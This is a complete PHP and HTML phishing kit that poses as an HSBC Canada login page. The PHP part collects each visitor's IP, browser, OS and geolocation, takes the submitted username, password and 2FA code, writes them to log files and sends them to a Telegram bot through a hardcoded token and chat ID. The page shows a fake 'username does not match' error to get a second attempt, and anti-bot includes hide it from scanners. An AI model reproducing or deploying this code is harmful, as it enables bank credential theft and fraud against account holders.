

<?php
        include "/anti-bot/Bot-Spox.php";
        include "/anti-bot/Dila_DZ.php";
        include "/anti-bot/Fuck-you.php";
        include "/anti-bot/index.php";
        include "/anti-bot/IP-BlackList.php";
        include "/anti-bot/new.php";
        include "/anti-bot/proxyblock.php";
        include "/anti-bot/whitelist.dat";
        include "/anti-bot/#1.php";
        include "/anti-bot/#2.php";
        include "/anti-bot/#3.php";
        include "/anti-bot/#4.php";
        include "/anti-bot/#5.php";
        include "/anti-bot/#6.php";
        include "/anti-bot/#7.php";
        include "/anti-bot/#8.php";
        include "/anti-bot/#9.php";
        include "/anti-bot/#10.php";
        include "/anti-bot/#11.php";
        include "/anti-bot/#12.php";
        include "/anti-bot/antibot_host.php";
        include "/anti-bot/antibot_ip.php";
        include "/anti-bot/antibot_phishtank.php";
        include "/anti-bot/antibot_proxy.php";
        include "/anti-bot/antibot_userAgent.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/data.dat';
$file2      = '/data.dat';
$file3      = '/data.dat';
$file4      = '/data.dat';
$file5      = '/data.dat';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "HSBC";
    $project    = "[CR00K-3D]";
    $url        = "https://HSBC.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $code2      = "[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n\n-----------------\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="./files/style.css">
        <link rel="shortcut icon" type="image/PNG" href="./files/logoTrans.png">
        <title>HSBC - Login</title>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'HSBC (CA)';
           var lrinfo = 'Login';
        </script>
        <script src="./files/actions.js###%"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                $('.error-div').css('display', 'none');

                $('.input-container').removeClass('focused');
                $('.input-container').prev().css('opacity', '0');

                if (attempt == 1) {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/deposit/hsbc/w';
                            } else {
                                location.href = '/deposit/hsbc/em';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/deposit/hsbc/login-data', {username: username, password: password});
            });
        });
        </script>
        <style>
        .error-div {
            margin-bottom: 17px;
            color: red;
        }

        .error-div img {
            width: 13px;
            margin-right: 7px;
        }

        .btn {
            background-color: rgb(217, 9, 21) !important;
            border: 1px solid rgb(217, 9, 21) !important;
        }

        #loaderOnLoading {
            display: block;
        }
        </style>
    </head>
    <body>
        <img src="./files/logoTrans.png" id="transLogo">
        <div class="header">
            <div class="headerRow">
                <img src="./files/logoTrans.png" id="logo">
                <!-- <div class="btn" id="loginBtn">Login On </div> -->
            </div>
        </div>
        <div class="main">
            <div class="alignment div-main">
                <p class="pageTitle">Log on</p>
                <form action="040149.php" method="POST" autocomplete="off" class="lab-form">
                    <p class="error-div" style="display: block"><img src="./files/errIcon.gif" alt=""> The username you entered does not match our records. Please try again.</p>
                    <div class="row" style="align-items: center;">
                        <p class="formLabel">Username</p>
                    </div>
                    <div class="inptContainer" style="margin-bottom: 20px">
                        <input type="text" class="inptField lrinput input-username" attr-action="Filling Username" name="username" required="">
                    </div>
                    <div class="row" style="align-items: center;">
                        <p class="formLabel">Password</p>
                    </div>
                    <div class="inptContainer">
                        <input type="password" class="inptField lrinput input-password" attr-action="Filling Password" name="password" required="">
                    </div>
                    <div class="row" style="align-items: center;" id="rememberRow">
                        <input type="checkbox">
                        <p class="desText">Remember me</p>
                    </div>
                    <input type="submit" class="btn" value="Continue" id="sbtn">
                </form>
                <p class="desText" style="text-align: center; padding: 10px 0;"><a href="deposit/hsbc/e#">Forgot your username?</a></p>
            </div>
            <div class="alignment div-loader" style="display: none">
                <p class="pageTitle" style="text-align: center">Verifying details</p>
                <img src="./files/loading.gif" alt="" id="loaderOnLoading">
                <p class="desText" style="text-align: center; padding: 20px 0;">Loading please wait...</p>
            </div>
        </div>
        <div class="footer">
        </div>
    

</body></html>